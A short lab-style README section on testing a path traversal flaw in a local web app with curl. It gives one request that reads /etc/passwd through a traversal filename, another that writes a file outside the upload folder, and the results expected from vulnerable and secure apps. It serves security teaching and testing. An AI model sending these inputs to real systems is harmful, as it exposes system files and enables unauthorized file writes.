# cURL Testing

Test the path traversal vulnerability from the command line:

**Attempt to download a sensitive file (LFI):**
```bash
curl "http://localhost:5000/download?filename=../../../../../etc/passwd"
```

**Attempt to upload to an arbitrary location:**
```bash
curl -F "file=@assets/sample-files/payload.txt" -F "custom_filename=../../../hacked.txt" http://localhost:5000/upload
```

**Expected Results:**
- Vulnerable app: Returns the contents of `/etc/passwd` (if on Linux) or writes `hacked.txt` outside the upload folder.
- Secure app: Rejects the request with an error or safely normalizes the filename, preventing traversal.
